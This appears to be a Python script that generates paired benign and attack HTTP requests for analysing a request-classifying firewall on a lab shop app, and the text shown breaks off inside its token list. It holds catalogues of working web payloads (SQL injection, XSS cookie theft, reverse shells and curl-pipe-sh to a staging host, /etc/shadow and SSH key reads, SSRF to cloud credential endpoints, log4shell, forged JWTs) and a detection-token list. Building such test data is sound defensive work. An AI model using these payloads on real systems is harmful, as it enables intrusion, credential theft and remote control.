"""
firewall-IA — PAIRED V4 <-> Analyzer DEVELOPMENT / ERROR-ANALYSIS diagnostic set (issue #59).

Generates paired BENIGN and ATTACK requests on the SAME lab-app endpoints / workflows, as exact
D1 request texts (data_plane.render_request layout). The texts are authored here and then
verified byte-for-byte against what the lab gateway renders (paired_dev_capture.py); the frozen
Analyzer and V4 never define a label.

DEVELOPMENT DATA from day one (D37, D45): it studies V4 / Analyzer disagreement and
complementarity. It is NOT an evaluation, NOT an external test, fixes no policy / threshold /
calibrator, and every count it feeds is a diagnostic count on a composition chosen by its
authors, never an FPR / FNR / recall / prevalence / operational rate (D42, methodology section 7).

UNIT OF ANALYSIS (Revision 1, after the owner's pre-scoring review).
  * The INDEPENDENT attack unit is the DISTINCT CANONICAL PAYLOAD. Each attack payload appears
    in exactly ONE placement (its natural endpoint), so one attack record == one independent
    payload. Payloads are distributed across endpoints so a family still spans query / path /
    form / JSON surfaces.
  * A small, explicitly separate PLACEMENT-SENSITIVITY sub-study repeats a few payloads across
    placements; those records carry placement_variant=True and are NEVER counted as independent.
  * Each attack record is paired with a benign near-neighbour on the SAME endpoint / placement,
    drawn from a realistic per-placement pool; benign values are reported by UNIQUE TEXT, and any
    reuse is a reported dependency, never an independent benign observation.
  * A category-level conclusion is drawn only for a family with >= 30 distinct canonical attack
    payloads (D18); otherwise the family is INSUFFICIENT INDEPENDENT SUPPORT.

GROUND TRUTH (semantic oracle, independent of any model):
  * An ATTACK case carries a canonical malicious payload of a named family, placed where the
    endpoint accepts it. Its label is BLOCK by construction = "a malicious attack ATTEMPT",
    justified by `oracle_reason`. It is NOT a claim that the payload successfully EXPLOITS the
    inert lab app (the lab establishes delivery and classification, never exploitation).
  * A BENIGN case carries a legitimate value for that endpoint. Its label is ALLOW.
  * `oracle_check()` is a documented defensive consistency assertion (not a detector, never
    applied to model output): every attack payload must match a documented family signature, and
    no benign VALUE may contain a "hard" unambiguous attack token. Benign near-neighbours that
    deliberately carry SQL-ish / symbol-rich ENGLISH (soft keywords select / drop / union / or)
    stay benign because those tokens are not in the hard set.

FAITHFULNESS: query / path payload values are percent-encoded so the request line round-trips
through mitmproxy unchanged; messy payloads prefer form / JSON bodies (opaque under
Content-Length). Hosts are the lab aliases shop.fwlab.test:9100 / api.fwlab.test:9100 — never a
loopback host (V4 shortcut, D1 / D44). Families the gateway cannot represent faithfully (HTTP
request smuggling, Host-header injection, stateful JWT / CSRF bypass) are NOT generated as
attacks; they are recorded as NOT TESTABLE.

Deterministic: no randomness, no clock. Same inputs -> byte-identical cases.jsonl.

    .venv-analyzer/bin/python scripts/evaluation/paired_dev_set.py generate --out <cases.jsonl>
    .venv-analyzer/bin/python scripts/evaluation/paired_dev_set.py manifest  --cases <cases.jsonl>
"""

import argparse
import hashlib
import json
import os
import re
import sys
from collections import Counter, OrderedDict, defaultdict
from urllib.parse import quote, unquote_plus

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

SHOP = "shop.fwlab.test:9100"
API = "api.fwlab.test:9100"
SCHEMA = "paired-dev-set/v1"
MIN_INDEPENDENT = 30  # D18 independence criterion: distinct canonical attack payloads per family


# ── D1 text construction (matches data_plane.render_request) ─────────────────
def render(method, host, path, query="", extra_headers=(), body=None, content_type=None):
    target = path + (("?" + query) if query else "")
    lines = [f"{method} {target} HTTP/1.1", f"Host: {host}"]
    if body is not None:
        b = body.encode("utf-8")
        if content_type is not None:
            lines.append(f"Content-Type: {content_type}")
        lines.append(f"Content-Length: {len(b)}")
    for name, value in extra_headers:
        if any(c in (name + value) for c in "\r\n"):
            raise ValueError("header may not contain a newline (gateway could not render it)")
        lines.append(f"{name}: {value}")
    text = "\n".join(lines)
    if body is not None:
        text += "\n\n" + body
    return text


def pct(value):
    return quote(value, safe="")


def form_body(pairs):
    return "&".join(f"{k}={pct(v)}" for k, v in pairs)


def json_body(obj):
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=True)


def sha_text(text):
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


FORM_CT = "application/x-www-form-urlencoded"
JSON_CT = "application/json"


# carriers: placement -> value -> (method, host, path, query, extra_headers, body, ct, visibility)
def c_search_q(v):
    return ("GET", SHOP, "/search", "q=" + pct(v), (), None, None, "surface")


def c_products_category(v):
    return ("GET", SHOP, "/products", "category=" + pct(v) + "&sort=id&page=1&limit=10",
            (), None, None, "surface")


def c_products_url(v):
    return ("GET", SHOP, "/products", "category=office&url=" + pct(v), (), None, None, "surface")


def c_search_next(v):
    return ("GET", SHOP, "/search", "q=shoes&next=" + pct(v), (), None, None, "surface")


def c_static_path(v):
    return ("GET", SHOP, "/static/" + pct(v), "", (), None, None, "surface")


def c_api_products_category(v):
    return ("GET", API, "/api/products", "category=" + pct(v), (), None, None, "surface")


def c_api_products_url(v):
    return ("GET", API, "/api/products", "url=" + pct(v), (), None, None, "surface")


def c_login_form(v):
    return ("POST", SHOP, "/login", "", (),
            form_body([("username", v), ("password", "s3cret!")]), FORM_CT, "surface")


def c_cart_form(v):
    return ("POST", SHOP, "/cart", "", (),
            form_body([("product_id", v), ("quantity", "1")]), FORM_CT, "surface")


def c_checkout_form(v):
    return ("POST", SHOP, "/checkout", "", (),
            form_body([("address", v), ("card_last4", "0000")]), FORM_CT, "surface")


def c_order_json(v):
    return ("POST", API, "/api/orders", "", (),
            json_body({"product_id": 3, "quantity": 1, "note": v}), JSON_CT, "surface")


def c_order_json_webhook(v):
    return ("POST", API, "/api/orders", "", (),
            json_body({"product_id": 3, "quantity": 1, "webhook": v}), JSON_CT, "surface")


def c_jwt_auth(v):
    return ("GET", API, "/api/me", "",
            (("Authorization", "Bearer " + v), ("Cookie", "fwlab_session=u=alice")),
            None, None, "header-only")


def c_csrf_origin(v):
    return ("POST", SHOP, "/cart", "",
            (("Origin", v), ("Referer", v + "/attack.html"), ("Cookie", "fwlab_session=u=alice")),
            form_body([("product_id", "3"), ("quantity", "1")]), FORM_CT, "header-dependent")


CARRIERS = {
    "search_q": c_search_q, "products_category": c_products_category, "products_url": c_products_url,
    "search_next": c_search_next, "static_path": c_static_path,
    "api_products_category": c_api_products_category, "api_products_url": c_api_products_url,
    "login_form": c_login_form, "cart_form": c_cart_form, "checkout_form": c_checkout_form,
    "order_json": c_order_json, "order_json_webhook": c_order_json_webhook,
    "jwt_auth": c_jwt_auth, "csrf_origin": c_csrf_origin,
}

# families whose attack payloads are distributed, one payload per record, across these placements
FAMILY_PLACEMENTS = {
    "sql_injection": ["search_q", "products_category", "api_products_category", "login_form",
                      "order_json", "checkout_form"],
    "xss": ["search_q", "products_category", "order_json", "checkout_form", "login_form"],
    "command_injection": ["search_q", "products_category", "api_products_category", "order_json",
                          "checkout_form"],
    "path_file_access": ["static_path", "products_url", "search_q", "api_products_url",
                         "order_json", "checkout_form"],
    "ssrf": ["products_url", "api_products_url", "order_json_webhook", "search_next"],
    "ssti": ["search_q", "order_json", "checkout_form"],
    "open_redirect": ["search_next", "products_url"],
    "other_attack": ["search_q", "products_category", "order_json", "checkout_form", "login_form"],
    "jwt": ["jwt_auth"],
    "csrf": ["csrf_origin"],
}

CONCLUSION_FAMILIES = ("sql_injection", "xss", "command_injection", "path_file_access", "ssrf")

FAMILY_TO_D47 = {
    "sql_injection": "sql_injection", "xss": "xss", "command_injection": "command_injection",
    "path_file_access": "path_file_access", "ssrf": "ssrf", "ssti": "ssti",
    "open_redirect": "open_redirect", "other_attack": "other_attack", "jwt": None,
    "csrf": "other_attack",
}
SIGNAL_LOCATION = {"surface": "surface", "header-only": "header-only",
                   "header-dependent": "header-dependent"}

# Placement-meaningfulness (Revision 1, independent-audit NB-1/NB-2). `natural_sink` = the
# field's ROLE is a plausible injection point for that family in a realistic shop/API app
# (query/filter/auth -> DB for SQLi; a reflected field for XSS; the /static path for traversal;
# a url/webhook param for SSRF). `generic_carrier` = a free-text field (order note, checkout
# address) or a field whose role does not match the family: the attack token is still DELIVERED
# and CLASSIFIED, but a V4 ALLOW there must NOT be read as an operational detection failure. The
# inert lab has no real shell sink, so command_injection has NO natural sink here (stated
# honestly). This is about field-role plausibility (what a request classifier's distribution
# cares about), never about exploitation.
NATURAL_SINK_PLACEMENTS = {
    "sql_injection": {"search_q", "products_category", "api_products_category", "login_form"},
    "xss": {"search_q", "products_category"},                 # the lab reflects these values
    "command_injection": set(),                               # no command sink in the inert lab
    "path_file_access": {"static_path"},                      # the only filesystem-path endpoint
    "ssrf": {"products_url", "api_products_url", "order_json_webhook"},  # url / webhook params
    "ssti": {"search_q"}, "open_redirect": {"search_next", "products_url"},
    "other_attack": set(),
}


def sink_type(family, placement, role):
    if role != "attack":
        return None
    if family in ("jwt", "csrf"):
        return "header_borne"
    return "natural_sink" if placement in NATURAL_SINK_PLACEMENTS.get(family, set()) \
        else "generic_carrier"

# ── attack payload catalogues: >= 30 DISTINCT canonical payloads per conclusion family ───────
ATTACKS = {
    "sql_injection": [
        ("tautology_or_1_1", "' OR '1'='1' -- "), ("tautology_or_1_eq_1_hash", "' OR 1=1#"),
        ("comment_admin", "admin'-- "), ("tautology_x_x", "' OR 'x'='x"),
        ("double_quote_tautology", '1" OR "1"="1'), ("paren_tautology", "1')) OR (('1'='1"),
        ("union_two_null", "1 UNION SELECT NULL,NULL-- -"),
        ("union_creds", "1 UNION SELECT username,password FROM users-- -"),
        ("union_info_schema", "1 UNION SELECT table_name,1 FROM information_schema.tables-- -"),
        ("union_hex_literal", "1 UNION SELECT 0x61646d696e,2-- -"),
        ("union_version", "-1 UNION SELECT @@version,2,3-- -"),
        ("union_load_file", "1 UNION SELECT LOAD_FILE('/var/db/secret'),2-- -"),
        ("error_extractvalue", "1 AND extractvalue(1,concat(0x7e,(SELECT database())))"),
        ("error_updatexml", "1 AND updatexml(1,concat(0x7e,version()),1)"),
        ("error_floor_rand", "1 AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),floor("
         "rand(0)*2))x FROM information_schema.tables GROUP BY x)a)"),
        ("error_cast_convert", "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))-- -"),
        ("time_sleep_mysql", "1' AND SLEEP(5)-- -"),
        ("time_waitfor_mssql", "1'; WAITFOR DELAY '0:0:5'--"),
        ("time_pg_sleep", "1 AND 1=(SELECT 1 FROM pg_sleep(5))--"),
        ("time_benchmark", "1 AND BENCHMARK(5000000,MD5(1))-- -"),
        ("blind_substring", "1' AND SUBSTRING(@@version,1,1)='5"),
        ("blind_ascii", "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- -"),
        ("blind_length", "1' AND LENGTH((SELECT password FROM users LIMIT 1))>5-- -"),
        ("order_by_probe", "1 ORDER BY 10-- -"),
        ("having_probe", "1 GROUP BY columnname HAVING 1=1-- -"),
        ("stacked_drop", "1; DROP TABLE users-- -"),
        ("stacked_insert", "1'; INSERT INTO users VALUES('h','h')-- -"),
        ("inline_comment_obfusc", "1'/**/OR/**/'1'='1"),
        ("limit_bypass", "1' OR '1'='1' LIMIT 1-- -"),
        ("like_wildcard", "%' OR '1'='1' -- "),
        ("procedure_analyse", "1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,version())),1)"),
        ("concat_subselect", "1'||(SELECT password FROM users WHERE username='admin')||'"),
        ("out_of_band_dns", "1' AND (SELECT 1 FROM dual WHERE 1=1 "
         "UNION SELECT LOAD_FILE(concat('\\\\\\\\',version(),'.dns.example\\\\x')))-- -"),
    ],
    "xss": [
        ("script_alert", "<script>alert(1)</script>"),
        ("script_fetch_cookie", "<script>fetch('/?c='+document.cookie)</script>"),
        ("img_onerror", "<img src=x onerror=alert(1)>"),
        ("img_src_js", "<img src=javascript:alert(1)>"),
        ("svg_onload", "<svg/onload=alert(1)>"),
        ("svg_script", "<svg><script>alert(1)</script></svg>"),
        ("body_onload", "<body onload=alert(1)>"),
        ("iframe_srcdoc", '<iframe srcdoc="<script>alert(1)</script>">'),
        ("iframe_src_js", "<iframe src=javascript:alert(1)>"),
        ("details_ontoggle", "<details open ontoggle=alert(1)>"),
        ("input_onfocus_autofocus", '"><input autofocus onfocus=alert(1)>'),
        ("attr_breakout_onmouseover", '" onmouseover=alert(1) x="'),
        ("anchor_onmouseover", "<a href=# onmouseover=alert(1)>x</a>"),
        ("style_url_js", '<div style="background:url(javascript:alert(1))">'),
        ("marquee_onstart", "<marquee onstart=alert(1)>"),
        ("video_onerror", "<video><source onerror=alert(1)>"),
        ("select_onfocus", "<select autofocus onfocus=alert(1)>"),
        ("textarea_onfocus", "<textarea autofocus onfocus=alert(1)>"),
        ("javascript_uri", "javascript:alert(document.cookie)"),
        ("svg_animate_onbegin", "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>"),
        ("js_unicode_escape", "<script>\\u0061lert(1)</script>"),
        ("onerror_base64_eval", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"),
        ("polyglot_svg", "'\"><svg/onload=alert(1)>"),
        ("polyglot_ja: javascript_comment", "javascript:/*--></title></style></textarea>"
         "</script><svg/onload=alert(1)>"),
        ("form_action_js", "<form action=javascript:alert(1)><input type=submit>"),
        ("meta_refresh_js", '<meta http-equiv=refresh content="0;url=javascript:alert(1)">'),
        ("object_data_js", "<object data=javascript:alert(1)>"),
        ("math_xlink_href", '<math><maction actiontype=statusline xlink:href=javascript:alert(1)>'),
        ("dom_location_hash", "<script>eval(location.hash.slice(1))</script>"),
        ("template_literal", "<script>`${alert(1)}`</script>"),
        ("onpointerover", "<div onpointerover=alert(1)>x</div>"),
        ("bgsound_onerror", "<bgsound src=x onerror=alert(1)>"),
    ],
    "command_injection": [
        ("semicolon_cat_passwd", "; cat /etc/passwd"),
        ("pipe_id", "| id"),
        ("double_pipe_or_id", "|| id"),
        ("and_ls_root", "&& ls -la /"),
        ("backtick_whoami", "`whoami`"),
        ("backtick_uname", "`uname -a`"),
        ("dollar_paren_uname", "$(uname -a)"),
        ("subshell_cat", "$(cat /etc/passwd)"),
        ("newline_cat", "x%0acat /etc/passwd"),
        ("ifs_bypass_cat", ";cat${IFS}/etc/passwd"),
        ("env_dump", "; env"),
        ("id_redirect", "; id > /tmp/out"),
        ("wget_stage", "; wget http://staging.example/x.sh -O /tmp/x"),
        ("curl_pipe_sh", "; curl http://staging.example/x.sh | sh"),
        ("nc_reverse", "; nc staging.example 4444 -e /bin/sh"),
        ("bash_tcp_reverse", "; bash -i >& /dev/tcp/staging.example/4444 0>&1"),
        ("python_spawn", "; python3 -c 'import os;os.system(\"id\")'"),
        ("perl_exec", "; perl -e 'exec(\"id\")'"),
        ("powershell_proc", "& powershell -c Get-Process"),
        ("cmd_type_hosts", "& type C:\\windows\\system32\\drivers\\etc\\hosts"),
        ("dir_windows", "& dir C:\\"),
        ("printenv", "`printenv`"),
        ("cat_shadow", "; cat /etc/shadow"),
        ("tac_passwd", "; tac /etc/passwd"),
        ("head_passwd", "| head -n2 /etc/passwd"),
        ("sleep_delay", "; sleep 5"),
        ("ping_oob", "; ping -c1 staging.example"),
        ("sh_c_id", "; sh -c id"),
        ("brace_expand", "{cat,/etc/passwd}"),
        ("getent_passwd", "; getent passwd"),
        ("crontab_list", "; crontab -l"),
        ("whoami_amp", "& whoami"),
    ],
    "path_file_access": [
        ("unix_passwd", "../../../../etc/passwd"),
        ("unix_shadow", "../../../../etc/shadow"),
        ("unix_hosts", "../../../../etc/hosts"),
        ("unix_hostname", "../../../../etc/hostname"),
        ("unix_issue", "../../../../etc/issue"),
        ("auth_log", "../../../../var/log/auth.log"),
        ("proc_environ", "../../../../proc/self/environ"),
        ("proc_cmdline", "../../../../proc/self/cmdline"),
        ("ssh_key", "../../../../root/.ssh/id_rsa"),
        ("bash_history", "../../../../root/.bash_history"),
        ("windows_ini", "..\\..\\..\\..\\windows\\win.ini"),
        ("windows_sam", "..\\..\\..\\..\\windows\\system32\\config\\sam"),
        ("web_inf", "../../WEB-INF/web.xml"),
        ("htpasswd", "../../.htpasswd"),
        ("env_file", "../../.env"),
        ("git_config", "../../.git/config"),
        ("encoded_passwd", "..%2f..%2f..%2fetc%2fpasswd"),
        ("double_encoded_passwd", "..%252f..%252fetc%252fpasswd"),
        ("utf8_overlong", "..%c0%af..%c0%afetc/passwd"),
        ("dot_dot_overlong", "....//....//etc/passwd"),
        ("nullbyte_image", "../../etc/passwd%00.png"),
        ("semicolon_path", "index.php/..;/..;/..;/etc/passwd"),
        ("absolute_shadow", "/etc/shadow"),
        ("absolute_passwd", "/etc/passwd"),
        ("php_filter_index", "php://filter/convert.base64-encode/resource=index.php"),
        ("php_filter_config", "php://filter/convert.base64-encode/resource=config.php"),
        ("file_scheme_passwd", "file:///etc/passwd"),
        ("expect_wrapper", "expect://id"),
        ("zip_wrapper", "zip:///tmp/x.zip%23shell.php"),
        ("data_wrapper_php", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"),
        ("backslash_traversal", "..\\..\\..\\boot.ini"),
        ("mixed_slash_traversal", "..\\../..\\../etc/passwd"),
    ],
    "ssrf": [
        ("aws_metadata_root", "http://169.254.169.254/latest/meta-data/"),
        ("aws_iam_creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("aws_imdsv2_token", "http://169.254.169.254/latest/api/token"),
        ("aws_userdata", "http://169.254.169.254/latest/user-data/"),
        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
        ("gcp_token", "http://metadata.google.internal/computeMetadata/v1/instance/"
         "service-accounts/default/token"),
        ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("alibaba_metadata", "http://100.100.100.200/latest/meta-data/"),
        ("localhost_admin", "http://127.0.0.1:8080/admin"),
        ("localhost_actuator", "http://127.0.0.1:8080/actuator/env"),
        ("internal_rfc1918_10", "http://10.0.0.1/"),
        ("internal_rfc1918_192", "http://192.168.0.1/"),
        ("internal_rfc1918_172", "http://172.16.0.1/"),
        ("redis_direct", "http://127.0.0.1:6379/"),
        ("gopher_redis", "gopher://127.0.0.1:6379/_INFO"),
        ("dict_memcache", "dict://127.0.0.1:11211/stats"),
        ("ftp_internal", "ftp://127.0.0.1/"),
        ("file_scheme_ssrf", "file:///etc/passwd"),
        ("ldap_internal", "ldap://127.0.0.1:389/"),
        ("decimal_ip", "http://2130706433/"),
        ("octal_ip", "http://0177.0.0.1/"),
        ("hex_ip", "http://0x7f000001/"),
        ("short_loopback", "http://127.1/admin"),
        ("ipv6_loopback", "http://[::1]/admin"),
        ("ipv6_mapped", "http://[0:0:0:0:0:ffff:127.0.0.1]/"),
        ("at_sign_bypass", "http://shop.fwlab.test@169.254.169.254/"),
        ("hash_bypass", "http://169.254.169.254#@shop.fwlab.test/"),
        ("dns_rebind_host", "http://metadata/latest/meta-data/"),
        ("enclosed_alphanum", "http://ⓛocalhost/"),
        ("port_scan_22", "http://127.0.0.1:22/"),
        ("port_scan_3306", "http://127.0.0.1:3306/"),
        ("sftp_internal", "sftp://127.0.0.1:22/etc/passwd"),
    ],
    # ── context families (reported; a category conclusion needs >= 30 distinct payloads, D18) ──
    "ssti": [
        ("twig_math", "{{7*7}}"), ("jinja_math", "${7*7}"), ("freemarker_hash", "#{7*7}"),
        ("smarty_math", "{$smarty.version}"), ("erb_math", "<%= 7*7 %>"),
        ("jinja_config", "{{config}}"), ("python_mro", "{{''.__class__.__mro__}}"),
        ("java_runtime", "${T(java.lang.Runtime).getRuntime().exec('id')}"),
        ("velocity", "#set($x=7*7)$x"), ("angular_constructor", "{{constructor.constructor('alert(1)')()}}"),
    ],
    "open_redirect": [
        ("protocol_relative", "//evil.example/path"),
        ("absolute_external", "https://evil.example/login"),
        ("backslash_bypass", "/\\evil.example"),
        ("at_confusion", "https://shop.fwlab.test@evil.example"),
        ("encoded_slashes", "%2f%2fevil.example"),
        ("triple_slash", "///evil.example"),
        ("whitespace_bypass", "https:/\\/\\evil.example"),
        ("data_uri_redirect", "data:text/html,<script>location='//evil.example'</script>"),
    ],
    "other_attack": [
        ("crlf_setcookie", "x%0d%0aSet-Cookie:sid=evil"),
        ("crlf_header_inject", "x%0d%0aX-Injected:1"),
        ("nosql_gt", '{"$gt":""}'),
        ("nosql_ne", '{"username":{"$ne":null},"password":{"$ne":null}}'),
        ("nosql_regex", '{"username":{"$regex":"^adm"}}'),
        ("ldap_wildcard", "*)(uid=*))(|(uid=*"),
        ("ldap_auth_bypass", "*)(|(objectclass=*"),
        ("xpath_tautology", "' or '1'='1' or ''='"),
        ("graphql_introspection", "{__schema{types{name}}}"),
        ("hpp_duplicate", "1&id=2&id=3"),
        ("xxe_entity_body", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
         '"file:///etc/passwd">]><r>&x;</r>'),
        ("log4shell_jndi", "${jndi:ldap://staging.example/a}"),
    ],
    "jwt": [
        ("alg_none", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."),
        ("alg_none_mixedcase", "eyJhbGciOiJOb05lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."),
        ("sig_stripped", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9."),
        ("kid_sqli", "eyJhbGciOiJIUzI1NiIsImtpZCI6IjEnIG9yICcxJz0nMSJ9.eyJzdWIiOiJhZG1pbiJ9.x"),
        ("kid_path_traversal", "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0."
         "eyJzdWIiOiJhZG1pbiJ9.x"),
        ("alg_confusion_hs", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.forged"),
    ],
    "csrf": [
        ("cross_origin_evil", "https://evil.example"),
        ("cross_origin_subdomain_spoof", "https://shop.fwlab.test.evil.example"),
        ("null_origin", "null"),
        ("http_downgrade", "http://shop.fwlab.test.evil.example"),
    ],
}

# explicit, SEPARATE placement-sensitivity sub-study: a few payloads repeated across placements.
# Records carry placement_variant=True and are NEVER counted toward the independent payloads.
PLACEMENT_STUDY = [
    ("sql_injection", "tautology_or_1_1", "' OR '1'='1' -- ",
     ["products_category", "order_json", "checkout_form"]),
    ("xss", "script_alert", "<script>alert(1)</script>", ["products_category", "checkout_form"]),
    ("command_injection", "pipe_id", "| id", ["order_json", "checkout_form"]),
    ("path_file_access", "unix_passwd", "../../../../etc/passwd",
     ["search_q", "order_json", "api_products_url"]),
    ("ssrf", "aws_metadata_root", "http://169.254.169.254/latest/meta-data/",
     ["api_products_url", "order_json_webhook"]),
]

# ── benign pools per placement (distinct, legitimate values for that endpoint) ───────────────
BENIGN_POOLS = {
    "search_q": ["running shoes size 42", "mechanical keyboard brown switches", "office chair",
                 "espresso beans 1kg", "yoga mat non slip", "usb-c hub 4k 60hz", "water bottle 1l",
                 "ceramic mug set of 4", "how to select a good password", "drop shipping guide",
                 "best standing desk 2024", "wireless mouse ergonomic", "laptop stand aluminium",
                 "noise cancelling headphones", "gift ideas under 50", "where to buy a monitor arm",
                 "return policy details", "running or trail shoes which is better",
                 "labor union history books", "select your plan comparison"],
    "products_category": ["office", "sport", "food", "electronics", "home", "outdoor", "kitchen",
                          "furniture", "accessories", "apparel", "garden", "toys", "stationery",
                          "audio", "fitness", "travel"],
    "api_products_category": ["office", "sport", "food", "electronics", "home", "outdoor",
                              "kitchen", "furniture", "accessories", "apparel", "garden", "audio"],
    "products_url": ["https://shop.fwlab.test/catalog/office.json",
                     "https://shop.fwlab.test/catalog/sport.json",
                     "https://shop.fwlab.test/feeds/new-arrivals.xml",
                     "https://shop.fwlab.test/promo/summer.json",
                     "https://cdn.fwlab.test/assets/catalog.json",
                     "https://shop.fwlab.test/catalog/food.json",
                     "https://shop.fwlab.test/reviews/latest.json",
                     "https://shop.fwlab.test/stock/warehouse-1.json"],
    "api_products_url": ["https://api.fwlab.test/v1/items", "https://api.fwlab.test/v1/catalog",
                         "https://api.fwlab.test/v1/stock", "https://cdn.fwlab.test/feed.json",
                         "https://api.fwlab.test/v1/prices", "https://api.fwlab.test/v1/reviews",
                         "https://api.fwlab.test/v1/categories", "1,2,3,4,5"],
    "search_next": ["/profile", "/cart", "/products", "/products/3", "/search?q=office",
                    "/checkout", "/login", "/"],
    "static_path": ["css/app.min.css", "img/logo-2024.png", "js/cart.js", "fonts/inter.woff2",
                    "img/products/3-thumb.png", "css/theme-dark.css", "js/search.js",
                    "img/banner-summer.webp"],
    "login_form": ["alice", "bob", "o'neil", "jose.ramirez", "user_123", "mary-jane",
                   "a.khan", "lee.wong", "sven", "fatima", "n.garcia", "test.user"],
    "cart_form": ["3", "4", "1", "7", "2", "5", "6", "8"],
    "checkout_form": ["10 O'Neil St, Apt #4", "221B Baker Street", "Rue de l'Eglise 5",
                      "14 Rose & Crown Ln.", "Flat 2/B, 7 King's Rd.", "500 Market St #300",
                      "Carrer de Mallorca, 401", "88 Nguyen Hue Blvd", "1 Infinite Loop",
                      "Postfach 12 34", "12 Rue Victor Hugo", "9 St. Mary's Gate"],
    "order_json": ["please gift-wrap, thanks!", "leave at the front desk", "coupon SAVE10 applied",
                   "call before delivery", "fragile - handle with care", "no plastic bags please",
                   "deliver after 6pm", "include a receipt", "ring the bell twice",
                   "birthday present <3", "add extra packaging", "match my previous order"],
    "order_json_webhook": ["https://api.fwlab.test/v1/notify", "https://hooks.fwlab.test/orders",
                           "https://api.fwlab.test/v1/notify?ref=abc",
                           "https://shop.fwlab.test/webhooks/order-created",
                           "https://api.fwlab.test/v1/events", "https://cdn.fwlab.test/pixel.gif"],
    "jwt_auth": ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsImlhdCI6MTcwMH0.aGVsbG9zaWcx",
                 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IiLCJpYXQiOjE3MDF9.aGVsbG9zaWcy",
                 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJvbCIsImlhdCI6MTcwMn0.aGVsbG9zaWcz",
                 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkYXZlIiwiaWF0IjoxNzAzfQ.aGVsbG9zaWc0",
                 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJldmUiLCJpYXQiOjE3MDR9.aGVsbG9zaWc1",
                 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmcmFuayIsImlhdCI6MTcwNX0.aGVsbG9zaWc2"],
    "csrf_origin": ["https://shop.fwlab.test"],
}

# standalone benign probes: structures the #57 diagnostic found the Analyzer scored high on
BENIGN_PROBES = [
    ("keyword_select_english", "search_q", "how to select a good password manager"),
    ("keyword_drop_english", "search_q", "drop shipping starter guide 2024"),
    ("keyword_union_english", "search_q", "credit union savings account options"),
    ("keyword_or_english", "search_q", "merino or synthetic base layer"),
    ("multi_id_batch", "api_products_url", "1,2,3,4,5"),
    ("fields_projection", "search_q", "name,price,category,stock,rating,sku"),
    ("symbol_rich_address", "checkout_form", "Apt #4/B, 10 O'Neil & Sons St. (rear)"),
    ("apostrophe_name_login", "login_form", "o'neil-stewart"),
    ("json_special_chars_note", "order_json", "gift note: <3 & >5 - \"thanks!\""),
    ("json_webhook_legit", "order_json_webhook", "https://api.fwlab.test/v1/notify?ref=abc&v=2"),
    ("url_catalog_legit", "products_url", "https://shop.fwlab.test/catalog/office.json?v=12"),
    ("path_asset_css", "static_path", "css/app.min.css"),
    ("path_asset_img", "static_path", "img/products/3-detail.png"),
    ("product_numeric", "cart_form", "7"),
    ("category_food", "products_category", "food"),
    ("search_plain", "search_q", "mechanical keyboard brown switches tenkeyless"),
    ("next_relative_legit", "search_next", "/profile"),
    ("jwt_valid_benign", "jwt_auth",
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsImlhdCI6MTcwMH0.dmFsaWRzaWdu"),
    ("csrf_same_origin_benign", "csrf_origin", "https://shop.fwlab.test"),
    ("order_coupon_legit", "order_json", "coupon WELCOME applied at checkout, please confirm"),
]

# ── semantic oracle: documented signatures (consistency assertion, not a detector) ──────────
HARD_ATTACK_TOKENS = [
    "<script", "<svg", "<img", "<iframe", "<body", "<details", "<marquee", "<video", "<select",
    "<textarea", "<form action", "<meta http-equiv", "<object", "<math", "<bgsound", "<a href",
    "onerror=", "onload=", "onfocus=", "ontoggle=", "onmouseover=", "onstart=", "onpointerover=",
    "javascript:", "<%=", "../", "..\\", "..%2f", "..%252f", "..%c0%af", "....//", "/etc/passwd",
    "/etc/shadow", "etc/passwd", "win.ini", "web.xml", "/proc/self", "/var/log", ".ssh/id_rsa",
    ".bash_history", ".htpasswd", "/.env", "/.git/", "boot.ini", "config/sam", "php://", "file://",
    "data://", "expect://", "zip://", "gopher://", "dict://", "ldap://", "ftp://", "sftp://",
    "169.254.169.254", "100.100.100.200", "metadata.google", "metadata/instance", "127.0.0.1",
    "127.1", "[::1]", "2130706433", "0177.0.0.1", "0x7f000001", "://10.0.0.1", "://192.168",
    "://172.16", "://metadata", ":6379", ":11211", ":3306", ":389", "actuator/env",
    "' or '1'='1", '" or "1"="1', "' or 'x'='x", "or 1=1", "union select", "drop table",
    "insert into", "sleep(", "pg_sleep", "benchmark(", "waitfor delay", "extractvalue(",
    "updatexml(", "information_schema", "load_file(", "procedure analyse", "/**/or/**/",
    "convert(int", "; cat", "| id", "|| id", "&& ls", "`whoami`", "`uname", "`printenv`",
